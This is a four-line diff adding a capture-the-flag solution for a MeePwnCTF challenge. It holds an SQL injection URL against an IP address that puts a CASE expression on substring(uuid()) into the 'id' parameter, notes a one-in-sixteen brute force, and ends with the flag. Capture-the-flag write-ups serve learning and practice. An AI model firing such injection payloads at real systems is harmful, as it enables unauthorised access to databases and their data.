@@ -1,0 +1,4 @@
+http://139.59.239.133/?id=(select case substring(uuid(),5,1) when 1 then 2 else 1 end)
+and then bruteforce a little bit (1/16 to get it right)
+
+# MeePwnCTF{_b4by_tr1ck_fixed}
